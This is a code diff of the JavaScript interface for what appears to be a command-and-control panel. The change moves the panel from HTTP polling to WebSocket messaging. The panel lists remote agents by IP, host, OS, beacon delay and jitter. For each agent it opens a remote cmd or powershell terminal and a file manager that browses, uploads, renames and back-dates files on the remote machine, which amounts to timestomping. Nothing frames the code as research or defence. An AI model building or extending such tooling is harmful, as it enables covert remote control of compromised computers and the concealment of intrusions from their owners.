+            webSocketClient.send(
+                
+                "msg",
+                {
+                    uid:this.uid,
+                    msg:powershell,
+                    Taskid:AgentTaskId
+                }
+            );
         }
-        renderFileList(fileContent, shell_dir = "") {
+        renderFileList(fileContent, shell_dir) {
 		    const div_file = document.getElementById('file_resp');
 		    div_file.innerHTML = '';
 		    const dir_list = fileContent.split("\n");
@@ -351,7 +1109,6 @@ class index{
 		        // === 重命名 ===
 		        new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
 		            e.stopPropagation();
-		
 		            const filenameSpan = new_file.querySelector('.filename');
 		            const oldName = filenameSpan.innerText;
 		            const oldPath = new_file.dataset.path;
@@ -362,12 +1119,16 @@ class index{
 		            const lastSlash = oldPath.lastIndexOf('/');
 		            const dirPath = lastSlash >= 0 ? oldPath.substring(0, lastSlash) : '';
 		            const newPath = dirPath ? (dirPath + '/' + newName) : newName;
-		
-		            const cmd = "CHANG_FILE_NAME*//*" + oldPath + "*//*" + newName;
-		            fetch(
-		                "/`+web_route+`?op=msg&uid=" + this.uid +"&msg=" + encodeURIComponent(cmd) +"&Taskid=" + TaskId
-		            );
-		
+                    const cmd = "CHANG_FILE_NAME*//*" + oldPath + "*//*" + newName;
+                    webSocketClient.send(
+                        
+                        "msg",
+                        {
+                            uid:this.uid,
+                            msg:cmd,
+                            Taskid:AgentTaskId
+                        }
+                    );
 		            filenameSpan.innerText = newName;
 		            new_file.dataset.path = newPath; // ⭐ 状态同步
 		        });
@@ -381,9 +1142,15 @@ class index{
 		            if (!newTime) return;
 		
 		            const cmd = "CHANG_FILE_TIME*//*" + currentPath + "*//*" + newTime;
-		            fetch(
-		                "/`+web_route+`?op=msg&uid=" + this.uid +"&msg=" + encodeURIComponent(cmd) +"&Taskid=" + TaskId
-		            );
+                    webSocketClient.send(
+                        
+                        "msg",
+                        {
+                            uid:this.uid,
+                            msg:cmd,
+                            Taskid:AgentTaskId
+                        }
+                    );
 		
 		            new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
 		        });
@@ -391,76 +1158,124 @@ class index{
 		        div_file.appendChild(new_file);
 		    }
 		}
-        async history_file() {
-            if (this.uid) {
-                const fileResponse = await fetch("/`+web_route+`?op=readFileList&uid=" + this.uid);
-                const result = await fileResponse.json();
-                const historyParent = document.getElementById('history');
-                if (historyParent) {
-                    historyParent.innerHTML = '';
-                    if (result && Array.isArray(result.data)) {
-                        result.data.forEach((item, idx) => {
-                            let listDiv = document.createElement('div');
-                            listDiv.textContent = item.list;
-                            listDiv.classList.add('history-item');
-                            listDiv.style.cursor = 'pointer';
-                            listDiv.style.display = 'flex';
-                            listDiv.style.justifyContent = 'space-between';
-                            listDiv.style.alignItems = 'center';
-                            listDiv.onclick = () => {
-                                if (item.file) {
-                                    this.shell_dir = item.list;
-                                    this.renderFileList(item.file, item.list);
-                                }
-                            };
-                            let delBtn = document.createElement('span');
-                            delBtn.textContent = '🗑️';
-                            delBtn.title = 'delete';
-                            delBtn.style.color = 'red';
-                            delBtn.style.cursor = 'pointer';
-                            delBtn.style.marginLeft = '8px';
-                            delBtn.onclick = async (e) => {
-                                e.stopPropagation();
-                                const index = Array.from(historyParent.children).indexOf(listDiv);
-                                const res = await fetch(
-                                    "/`+web_route+`?op=delFileList&uid=" +
-                                    this.uid + "&index=" + index
+        async history_file(uid) {
+            uid = uid || this.uid;
+            const historyParent = document.getElementById('history');
+            const historyData = Array.isArray(fileQueues[uid]) ? fileQueues[uid] : [];
+            if(historyParent){
+                historyParent.innerHTML='';
+                if(historyData.length > 0){
+                    historyData.forEach((item)=>{
+                        let listDiv=document.createElement('div');
+                        listDiv.classList.add('history-item');
+                        const labelSpan = document.createElement('span');
+                        labelSpan.className = 'history-item-label';
+                        labelSpan.textContent = item.list || '';
+                        listDiv.onclick=()=>{
+                            if(item.file){
+                                this.shell_dir=item.list;
+                                this.renderFileList(
+                                    item.file,
+                                    item.list
                                 );
-                                const r = await res.json();
-                                if (r.code === "200") {
-                                    listDiv.remove();
-                                } else {
-                                    console.log("Failed to delete file: " + (r.message || "Unknown error"));
+                            }
+                        };
+                        let delBtn=document.createElement('button');
+                        delBtn.type = 'button';
+                        delBtn.className = 'history-delete-btn';
+                        delBtn.textContent='🗑';
+                        delBtn.title='delete';
+                        delBtn.onclick=async(e)=>{
+                            e.stopPropagation();
+                            const index = Array.from(historyParent.children).indexOf(listDiv);
+                            const res = await webSocketClient.send(
+                                
+                                "delFileList",
+                                {
+                                    uid:uid,
+                                    index:String(index)
                                 }
-                            };
-                            listDiv.appendChild(delBtn);
-                            historyParent.appendChild(listDiv);
-                        });
-                    }
+                            );
+                            if(res.code===200){
+                                if (Array.isArray(fileQueues[uid])) {
+                                    fileQueues[uid].splice(index, 1);
+                                }
+                                listDiv.remove();
+                                customLog("History deleted");
+                            }else{
+                                console.log(
+                                    "delete failed:",
+                                    res.message
+                                );
+                            }
+                        };
+                        listDiv.appendChild(labelSpan);
+                        listDiv.appendChild(delBtn);
+                        historyParent.appendChild(listDiv);
+                    });
                 }
             }
         }
         async look_file(dir) {
-            if (this.uid && dir) {
-                const powershell = "LOOK_UP_FILE*//*" + dir;
-                try {
-                    await fetch("/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(powershell)+"&Taskid="+TaskId);
-                    while (true) {
-                        await new Promise(resolve => setTimeout(resolve, 5000));
-                        const fileResponse = await fetch("/`+web_route+`?op=getFileList&uid=" + this.uid+"&Taskid="+TaskId);
-                        const data = await fileResponse.text();
-                        if (data) {
-                            this.renderFileList(data, this.shell_dir);
-                            this.history_file()
-                            return true;
-                        } else if (data === "is empty") {
-                            return false;
-                        }
+            dir = dir || this.shell_dir || "./";
+            if(!this.uid || !dir){
+                return false;
+            }
+            const powershell = "LOOK_UP_FILE*//*" + dir;
+            try {
+                const sent = await webSocketClient.send(
+                    "msg",
+                    {
+                        uid:this.uid,
+                        msg:powershell,
+                        Taskid:AgentTaskId
                     }
-                } catch (error) {
-                    console.error("Viewing directory failed:", error);
+                );
+                if(!sent){
                     return false;
                 }
+                const deadline = Date.now() + 15000;
+                while(Date.now() < deadline){
+                    const responsePromise = webSocketClient.waitForMessage(
+                        (msg)=>{
+                            return msg.path === "getFileList" &&
+                                msg.code === 200 &&
+                                msg.uid === this.uid &&
+                                msg.taskid === AgentTaskId;
+                        },
+                        1200
+                    );
+                    const listSent = await webSocketClient.send(
+                        "getFileList",
+                        {
+                            uid:this.uid,
+                            Taskid:AgentTaskId
+                        }
+                    );
+                    if(!listSent){
+                        return false;
+                    }
+                    try{
+                        const result = await responsePromise;
+                        if(result && result.data){
+                            this.shell_dir = dir;
+                            this.renderFileList(
+                                result.data,
+                                this.shell_dir
+                            );
+                            this.history_file(this.uid);
+                            return true;
+                        }
+                    }catch(waitErr){
+                    }
+                    await new Promise((resolve)=>{
+                        setTimeout(resolve, 500);
+                    });
+                }
+                return false;
+            } catch(err) {
+                console.error(err);
+                return false;
             }
         }
          async move_file(num, cur_dir) {
@@ -483,7 +1298,7 @@ class index{
                     let flag = await this.look_file(this.shell_dir);
                     if (!flag) {
                         this.shell_dir = temp_dir; // 回退路径
-                        alert("!Does not exist or has no permission to access this directory?");
+                        customLog("!Does not exist or has no permission to access this directory?");
                     }
                     console.log(this.shell_dir);
                 }
@@ -517,185 +1332,171 @@ class index{
 
         switchVer(value){
             let cmd = "SWITCH_VERSION*//*"+value;
-            fetch("/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(cmd)+"&Taskid="+TaskId);
+            webSocketClient.send(
+                "msg",
+                {
+                    uid:this.uid,
+                    msg:cmd,
+                    Taskid:AgentTaskId
+                }
+            );
         }
     }
     
     //主页面类
     class lain_index{
-        constructor() {
-            this.username = this.getCookie("cookie");
-            this.User_data = [];
-            this.check_time = [];
-            this.check_uid = [];
-        }
-        getCookie(name) {
-            let cookies = document.cookie.split('; ');
-            for (let i = 0; i < cookies.length; i++) {
-                let cookie = cookies[i];
-                let cookieParts = cookie.split('=');
-                if (cookieParts[0] === name) {
-                    return cookieParts[2];
+        lain_shell(){
+            if(!Username){
+                return;
+            }
+            webSocketClient.send(
+                
+                "agentList",
+                {
+                    username: Username
                 }
-            }
-            return null;
+            );
         }
-        lain_shell() {
-            if (this.username) {
-                let container = document.getElementById('div_index');
-                setInterval(() => {
-                    let interval_server = "/`+web_route+`?op=userIndex&clientsCount=" + Object.keys(this.User_data).length;
-                    fetch(interval_server)
-                        .then(response => {
-                            if (!response.ok && response.status === 400) {
-                                return response.text(); 
-                            }
-                            if (response.ok) {
-                                if (response.headers.get('Content-Type').includes('application/json')) {
-                                    return response.json();
-                                } else {
-                                    return {};
-                                }
-                            } else {
-                                return {};
-                            }
-                        })
-                        .then(data => {
-                            if (data === 'noNeeded') {
-                                return;
-                            } else if (Array.isArray(data) && data.length > 0) {
-                                this.User_data = data;
-                                net_init(this.User_data);
-                                this.User_data.forEach(key => {
-                                    let userDiv = document.getElementById(key['uid'] + "info");
-                                    if (!userDiv) {
-                                        userDiv = document.createElement('div');
-                                        userDiv.classList.add('ip-info');
-                                        userDiv.id = key['uid'] + "info";
-                                        container.appendChild(userDiv);
-                                    }
-
-                                    let pluginButtons = ''; // 收集所有按钮 HTML
-                                    let pluginParam = key['plugin_parameter'];
-                                    let os = key['os'].toLowerCase(); // 加入 os 判断
-
-                                    if (pluginParam && typeof pluginParam === 'object' && pluginParam[os]) {
-                                        for (let codeword in pluginParam[os]) {
-                                            let paramDescList = pluginParam[os][codeword];
-                                            console.log('客户端', key['uid'], os + '插件：', codeword, paramDescList);
-                                            let encodedDesc = encodeURIComponent((Array.isArray(paramDescList) ? paramDescList : []).join(','));
-                                            let plugindiv = '<button class="console-link" onclick="showPluginDialog(\''
-                                                + key['uid'] + '\', \'' + os + '\', \'' + encodedDesc + '\', \'' + codeword + '\')">[' + codeword + ']</button>';
-                                            pluginButtons += plugindiv;
-                                        }
-                                    }
-
-                                    let osEmoji = "💻";
-                                    if (os.includes("linux")) {
-                                        osEmoji = "🐧";
-                                    } else if (os.includes("macos")) {
-                                        osEmoji = "🍏";
-                                    } else if (os.includes("android")) {
-                                        osEmoji = "🤖";
-                                    }
-
-                                    let userHTML = '<div class="conn-container">' +
-                                        '<span class="shell-address">' + key['external_ip'] + '/</span>' +
-                                        '<span class="ip-address">' + key['host'] + '/</span>' +
-                                        '<span class="ip-address">' + key['uid'] + '/</span>' +
-                                        '<span class="ip-address">'+ osEmoji + '/' + key['os'] + '</span>' +
-                                        '<div class="os-container">' +
-                                            '<div class="ip-address" id="' + key['uid'] + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>' +
-                                        '</div>' +
-                                    '</div>' +
-                                    '<div class="button-container">' +
-                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'info\')">[info]</button>' +
-                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'choose\')">[☰]</button>' +
-                                        '<button class="console-link" onclick="del(\'' + key['uid'] + '\')">🗑️</button>' +
-                                    '</div>' +
-                                    '<div class="info-content" id="' + key['uid'] + '-info-content">' +
-                                        '<p><strong class="s_left">Remarks:</strong><input type="text" value="' + key['remarks'] + '" id="remarks_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
-                                        '<p><strong class="s_left">Path:</strong><strong class="s_right">' + key['current_dir'] + '</strong></p>' +
-                                        '<p><strong class="s_left">Host:</strong><strong class="s_right">' + key['host'] + '</strong></p>' +
-                                        '<p><strong class="s_left">IP Addresses:</strong><strong class="s_right">' + key['local_ip'] + '</strong></p>' +
-                                        '<p><strong class="s_left">Check:</strong><strong id="' + key['uid'] + '-check" class="s_right">' + key['check_time'] + '</strong></p>' +
-                                        '<p><strong class="s_left">Executable:</strong><strong class="s_right">' + key['executable'] + '</strong></p>' +
-                                        '<p><strong class="s_left">OS:</strong><strong class="s_right">' + key['os'] + '</strong></p>' +
-                                        '<p><strong class="s_left">Delay:</strong><input type="text" value="' + key['delay'] + '" id="delay_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
-                                        '<p><strong class="s_left">Jitter:</strong><input type="text" value="' + key['jitter'] + '" id="jitter_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
-                                        '<p><strong class="s_left">UID:</strong><strong class="s_right">' + key['uid'] + '</strong></p>' +
-                                        '<p><strong class="s_left">Server:</strong><strong class="s_right">' + key['server'] + '</strong></p>' +
-                                        '<p><strong class="s_left">Username:</strong><input type="text" value="' + key['username'] + '" id="username_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
-                                        '<button class="console-link" onclick="saveInfo(\'' + key['uid'] + '\')">Save Changes</button>' +
-                                    '</div>' +
-                                    '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
-                                        '<button class="console-link" onclick="showTerminalDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\', \'' + key['os'] + '\')">💻</button>' +
-                                        '<button class="console-link" onclick="showFileDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\')">🗂️</button>' +
-                                        '<button class="console-link" onclick="showMsgDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\')">📩</button>' +
-                                        pluginButtons +
-                                    '</div>' +
-                                    '<div class="info-content" id="' + key['uid'] + '-msg-content"></div>';
-
-                                    userDiv.innerHTML = userHTML;
-                                });
-                            } else if (Array.isArray(data) && data.length === 0) {
-                                console.log("No data available, clearing container.");
-                                container.innerHTML = '';
-                            }
-                        })
-                        .catch(error => {
-                            console.error("Error fetching data:", error);
-                        });
-                }, 5000);
+        renderUserList(data) {
+            let container = document.getElementById('div_index');
+            if (!container) {
+                return;
             }
+            container.innerHTML = "";
+            data.forEach(key=>{
+                let userDiv = document.createElement('div');
+                userDiv.classList.add('ip-info');
+                userDiv.id = key.uid + "info";
+                let os = (key.os || "").toLowerCase();
+                let osEmoji = "💻";
+                if(os.includes("linux")){
+                    osEmoji="🐧";
+                }
+                else if(os.includes("macos")){
+                    osEmoji="🍏";
+                }
+                else if(os.includes("android")){
+                    osEmoji="🤖";
+                }
+                let pluginButtons = "";
+                let pluginParam = key.plugin_parameter;
+                if(pluginParam && pluginParam[os]){
+                    for(let codeword in pluginParam[os]){
+                        pluginButtons += 
+                        '<button class="console-link">'+
+                        '['+codeword+']'+
+                        '</button>';
+                    }
+                }
+                let userHTML = '<div class="conn-container">' +
+                                '<span class="shell-address">' + key['external_ip'] + '/</span>' +
+                                '<span class="ip-address">' + key['host'] + '/</span>' +
+                                '<span class="ip-address">' + key['uid'] + '/</span>' +
+                                '<span class="ip-address">' + key['protocol'] + '/</span>' +
+                                '<span class="ip-address">'+ key['os']  + '/' + osEmoji + '</span>' +
+                                '<div class="os-container">' +
+                                    '<div class="ip-address" id="' + key['uid'] + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>' +
+                                '</div>' +
+                            '</div>' +
+                            '<div class="button-container">' +
+                                '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'info\')">[info]</button>' +
+                                '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'choose\')">[☰]</button>' +
+                                '<button class="console-link" onclick="del(\'' + key['uid'] + '\')">🗑️</button>' +
+                            '</div>' +
+                            '<div class="info-content" id="' + key['uid'] + '-info-content">' +
+                                '<p><strong class="s_left">Remarks:</strong><input type="text" value="' + key['remarks'] + '" id="remarks_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
+                                '<p><strong class="s_left">Path:</strong><strong class="s_right">' + (key['current_dir'] || '-') + '</strong></p>' +
+                                '<p><strong class="s_left">Host:</strong><strong class="s_right">' + key['host'] + '</strong></p>' +
+                                '<p><strong class="s_left">IP Addresses:</strong><strong class="s_right">' + key['local_ip'] + '</strong></p>' +
+                                '<p><strong class="s_left">Check:</strong><strong id="' + key['uid'] + '-check" class="s_right">' + key['check_time'] + '</strong></p>' +
+                                '<p><strong class="s_left">Executable:</strong><strong class="s_right">' + key['executable'] + '</strong></p>' +
+                                '<p><strong class="s_left">OS:</strong><strong class="s_right">' + key['os'] + '</strong></p>' +
+                                '<p><strong class="s_left">Delay:</strong><input type="text" value="' + key['delay'] + '" id="delay_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
+                                '<p><strong class="s_left">Jitter:</strong><input type="text" value="' + key['jitter'] + '" id="jitter_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
+                                '<p><strong class="s_left">UID:</strong><strong class="s_right">' + key['uid'] + '</strong></p>' +
+                                '<p><strong class="s_left">Server:</strong><strong class="s_right">' + key['server'] + '</strong></p>' +
+                                '<p><strong class="s_left">Username:</strong><input type="text" value="' + key['username'] + '" id="username_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
+                                '<button class="console-link" onclick="saveInfo(\'' + key['uid'] + '\')">Save Changes</button>' +
+                            '</div>' +
+                            '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
+                                '<button type="button" class="console-link" onclick="showTerminalDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\', \'' + key['os'] + '\')">💻</button>' +
+                                '<button type="button" class="console-link file-open-btn" data-uid="' + key['uid'] + '" data-host="' + key['host'] + '" data-dir="' + (key['current_dir'] || './') + '">🗂️</button>' +
+                                '<button type="button" class="console-link" onclick="showMsgDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\')">📩</button>' +
+                                pluginButtons +
+                            '</div>' +
+                            '<div class="info-content" id="' + key['uid'] + '-msg-content"></div>';
+                            userDiv.innerHTML = userHTML;
+                            container.appendChild(userDiv);
+            });
         }
         showTerminalDialog(uid, host, os) {
-            let dialog = document.getElementById("terminal-dialog");
-            if (!dialog) {
-                dialog = document.createElement("div");
-                dialog.id = "terminal-dialog";
-                dialog.style.position = "fixed";
-                dialog.style.top = "5%";
-                dialog.style.left = "50%";
-                dialog.style.transform = "translateX(-50%)";
-                dialog.style.background = "#fff";
-                dialog.style.zIndex = 9999;
-                dialog.style.maxWidth = "900px";
-                dialog.style.width = "90vw";
-                dialog.style.maxHeight = "90vh";
-                dialog.style.overflow = "auto";
-                dialog.style.border = "1px solid #ccc";
-                dialog.style.borderRadius = "8px";
-                dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
-                dialog.style.padding = "16px";
-                dialog.style.userSelect = "none";
-                dialog.style.touchAction = "none";
-                document.body.appendChild(dialog);
-            } else {
-                dialog.innerHTML = "";
+            const dialogId = "terminal-dialog-" + uid;
+            let dialog = document.getElementById(dialogId);
+            let terminal = null;
+            if (dialog) {
+                dialog.style.display = "block";
+                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+                terminal = window.terminalSessions ? window.terminalSessions[uid] : null;
+                if (terminal) {
+                    window.activeTerminal = terminal;
+                    if (terminal.currentInput && terminal.currentInput.isConnected) {
+                        terminal.currentInput.focus();
+                    }
+                }
+                return;
             }
+            dialog = document.createElement("div");
+            dialog.id = dialogId;
+            dialog.dataset.uid = uid;
+            dialog.style.position = "fixed";
+            dialog.style.top = "5%";
+            dialog.style.left = "50%";
+            dialog.style.transform = "translateX(-50%)";
+            dialog.style.background = "linear-gradient(180deg, #fbfdff 0%, #f2f6fb 100%)";
+            dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+            dialog.style.maxWidth = "900px";
+            dialog.style.width = "90vw";
+            dialog.style.maxHeight = "90vh";
+            dialog.style.overflow = "auto";
+            dialog.style.border = "1px solid rgba(138, 160, 178, 0.25)";
+            dialog.style.borderRadius = "18px";
+            dialog.style.boxShadow = "0 24px 60px rgba(44, 72, 98, 0.18)";
+            dialog.style.padding = "18px";
+            dialog.style.userSelect = "none";
+            dialog.style.touchAction = "none";
+            dialog.style.backdropFilter = "blur(10px)";
+            document.body.appendChild(dialog);
 
             // 拖动条和内容
             dialog.innerHTML =
-                '<div id="terminal-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
-                '<button id="terminal-close-btn" type="button" style="position:absolute;right:10px;top:5px;z-index:10002;width:28px;height:28px;border-radius:50%;background:#f44336;color:#fff;border:none;display:flex;align-items:center;justify-content:center;font-size:18px;line-height:1;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,0.08);transition:background 0.2s;" onmouseover="this.style.background=\'#d32f2f\'" onmouseout="this.style.background=\'#f44336\'">×</button>' +
-                '<div class="shell-container" style="margin-top:32px;">' +
-                "<label for='options' style='margin-right: 10px;'>Select Shell:</label>" +
-                "<select id='os_options' name='options' style='margin-left: 10px;'></select>" +
-                "<p id='hostname' style='margin-left: 10px; font-size: 10px;'>Host:" + host + "</p>" +
+                '<div class="terminal-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:36px;cursor:move;background:linear-gradient(90deg, rgba(230,236,243,0.95), rgba(243,247,251,0.9));border-top-left-radius:18px;border-top-right-radius:18px;z-index:10001;border-bottom:1px solid rgba(138,160,178,0.18);"></div>' +
+                '<button class="dialog-close-btn terminal-close-btn" type="button">×</button>' +
+                '<div class="shell-container" style="margin-top:34px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;padding:8px 4px 14px 4px;">' +
+                "<label for='options' style='color:#4f6477;font-size:13px;'>Select Shell:</label>" +
+                "<select class='terminal-shell-select' name='options' style='min-width:150px;padding:8px 12px;border-radius:999px;border:1px solid rgba(138,160,178,0.35);background:#fff;color:#314657;'></select>" +
+                "<p class='terminal-hostname' style='margin-left:auto;font-size:12px;color:#6a7f92;'>Host: " + host + "</p>" +
                 '</div>' +
-                '<div class="terminal" id="terminal">' +
+                '<div class="terminal" style="background:#f8fbff;border-radius:16px;border:1px solid rgba(160,176,194,0.32);padding:16px;min-height:420px;color:#000000;box-shadow:inset 0 1px 0 rgba(255,255,255,0.72);">' +
                 '<div class="input-container"></div>' +
                 '</div>' +
-                '<link rel="stylesheet" href="/`+web_css+`">';
+                '<link rel="stylesheet" href="test.css">';
 
             // 关闭按钮
-            dialog.querySelector("#terminal-close-btn").onclick = function () {
+            dialog.querySelector(".terminal-close-btn").onclick = function () {
+                if (terminal) {
+                    terminal.stopAllResultsForUid(uid);
+                    if (window.terminalSessions) {
+                        delete window.terminalSessions[uid];
+                    }
+                    if (window.activeTerminal === terminal) {
+                        window.activeTerminal = null;
+                    }
+                }
                 dialog.remove();
             };
 
             // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
-            const dragBar = dialog.querySelector("#terminal-drag-bar");
+            const dragBar = dialog.querySelector(".terminal-drag-bar");
             let isDragging = false, offsetX = 0, offsetY = 0, startX = 0, startY = 0;
 
             function clamp(val, min, max) {
@@ -754,7 +1555,7 @@ class index{
 
             setTimeout(() => {
                 // 初始化 shell 选项
-                const optionsElement = document.getElementById("os_options");
+                const optionsElement = dialog.querySelector(".terminal-shell-select");
                 if (os == "win") {
                     optionsElement.innerHTML = "<option>Shell</option><option value='cmd'>cmd</option><option value='powershell'>powershell</option><option value='custom'>customize shell</option>";
                 } else if (os == "linux" || os == "macos") {
@@ -764,13 +1565,20 @@ class index{
                 }
 
                 // 创建 terminal 实例并初始化
-                const terminal = new lain_terminal();
+                terminal = new lain_terminal();
                 terminal.uid = uid;
-                terminal.init();
+                terminal.dialogEl = dialog;
 
                 // 让 terminal 内部管理输入框和事件
-                terminal.inputContainer = document.querySelector("#terminal .input-container");
+                terminal.inputContainer = dialog.querySelector(".terminal .input-container");
+                terminal.terminalEl = dialog.querySelector(".terminal");
+                window.terminalSessions[uid] = terminal;
+                window.activeTerminal = terminal;
                 terminal.createInput();
+                dialog.addEventListener("mousedown", function() {
+                    window.activeTerminal = terminal;
+                    dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+                });
 
                 // shell切换
                 optionsElement.addEventListener("change", function () {
@@ -793,7 +1601,7 @@ class index{
                 });
             }, 200);
         }
-        showFileDialog(uid, host) {
+        showFileDialog(uid, host, dir) {
             // 检查是否已存在弹窗
             let dialog = document.getElementById("file-dialog");
             if (!dialog) {
@@ -807,12 +1615,11 @@ class index{
                 dialog.style.zIndex = 9999;
                 dialog.style.maxWidth = "1100px";
                 dialog.style.width = "95vw";
-                dialog.style.maxHeight = "90vh";
+                dialog.style.height = "85%";
                 dialog.style.overflow = "hidden";
                 dialog.style.border = "1px solid #ccc";
                 dialog.style.borderRadius = "8px";
                 dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
-                dialog.style.padding = "16px";
                 dialog.style.userSelect = "none";
                 dialog.style.touchAction = "none";
                 document.body.appendChild(dialog);
@@ -823,11 +1630,11 @@ class index{
             // 拖动条和内容
             dialog.innerHTML =
                 '<div id="file-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
-                '<button id="file-close-btn" type="button" style="position:absolute;right:10px;top:5px;z-index:10002;width:28px;height:28px;border-radius:50%;background:#f44336;color:#fff;border:none;display:flex;align-items:center;justify-content:center;font-size:18px;line-height:1;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,0.08);transition:background 0.2s;" onmouseover="this.style.background=\'#d32f2f\'" onmouseout="this.style.background=\'#f44336\'">x</button>' +
+                '<button id="file-close-btn" class="dialog-close-btn" type="button">×</button>' +
                 '<div style="display:flex;width:100%;margin-top:32px;position:relative;height:calc(90vh - 48px);overflow:hidden;">' +
                     '<div id="history" class="file-history" style="width:200px;min-width:80px;max-width:80vw;transition:width 0.1s;"></div>' +
                     '<div id="file-history-resizer" style="min-width:6px;cursor:col-resize;background:#e0e0e0;z-index:10;"></div>' +
-                    '<div class="filecontainer" style="flex:1;min-width:80px;overflow:auto;height:100%;">' +
+                    '<div class="filecontainer">' +
                         '<div>' +
                             '<div style="display: flex; align-items: center;">' +
                                 "<p id='hostname' style='margin-right: 25px;'>Host:" + host + "</p>" +
@@ -848,7 +1655,7 @@ class index{
                         '</div>' +
                     '</div>' +
                 '</div>' +
-                '<link rel="stylesheet" href="/`+web_css+`">';
+                '<link rel="stylesheet" href="test.css">';
 
             // 关闭按钮
             dialog.querySelector("#file-close-btn").onclick = function () {
@@ -967,39 +1774,46 @@ class index{
             setTimeout(function () {
                 const fliemanage = new lain_terminal();
                 fliemanage.uid = uid;
-                fliemanage.init();
+                window.activeFileManager = fliemanage;
                 
                 let hostname = document.getElementById("hostname");
                 hostname.innerText = "Host:" + host;
 
                 // 上传表单
-                document.getElementById("uploadForm").addEventListener("submit", function(event) {
+                document.getElementById("uploadForm").addEventListener("submit",
+                async function(event){
                     event.preventDefault();
-                    var fileInput = document.getElementById("uploadFile");
-                    var file = fileInput.files[0];
-                    var splitSizeInput = document.getElementById("splitSize");
-                    var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
-                    if (file) {
-                        let file_name = fliemanage.shell_dir + "/" + file.name;
-                        var fileSize = file.size;
-                        var formData = new FormData();
-                        formData.append("uploadFile", file);
-                        formData.append("uid", fliemanage.uid);
-                        formData.append("filename", file_name);
-                        formData.append("splitSize", splitSize);
-                        var xhr = new XMLHttpRequest();
-                        xhr.open("POST", "/`+web_route+`?op=uploadFile", true);
-                        xhr.onload = function() {
-                            if (xhr.status === 200) {
-                                console.log(file_name,"File uploaded successfully");
-                                fliemanage.loadFile(file_name, fileSize);
-                            } else {
-                                alert("The file is being used");
-                            }
-                        };
-                        xhr.send(formData);
-                    } else {
-                        alert("Please select a file");
+                    const fileInput = document.getElementById("uploadFile");
+                    const file = fileInput.files[0];
+                    if(!file){
+                        customAlert("Please select a file");
+                        return;
+                    }
+                    const splitSizeInput = document.getElementById("splitSize");
+                    const splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
+                    const file_name = fliemanage.shell_dir + "/" + file.name;
+                    try{
+                        await webSocketClient.sendFile(
+                            "uploadFile",
+                            {
+                                uid:fliemanage.uid,
+                                filename:file_name,
+                                splitSize:String(splitSize)
+                            },
+                            file,
+                            32 * 1024
+                        );
+                        console.log(file_name,"File uploaded successfully");
+                        fliemanage.loadFile(
+                            file_name,
+                            file.size
+                        );
+                    }catch(err){
+                        console.error(
+                            "upload error:",
+                            err
+                        );
+                        customLog("Upload failed");
                     }
                 });
 
@@ -1014,14 +1828,10 @@ class index{
                 };
 
                 // 初始化
-                fliemanage.history_file();
-                fliemanage.look_file("./");
+                fliemanage.shell_dir = dir || "./";
+                fliemanage.history_file(uid);
+                fliemanage.look_file(fliemanage.shell_dir);
 
-                // 跳转无登录
-                let username = fliemanage.username;
-                if (!username) {
-                    window.location.href = "about:blank";
-                }
             }, 200);
         }
         showMsgDialog(uid, host) {
@@ -1054,7 +1864,7 @@ class index{
             // 拖动条和内容
             dialog.innerHTML =
                 '<div id="msg-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
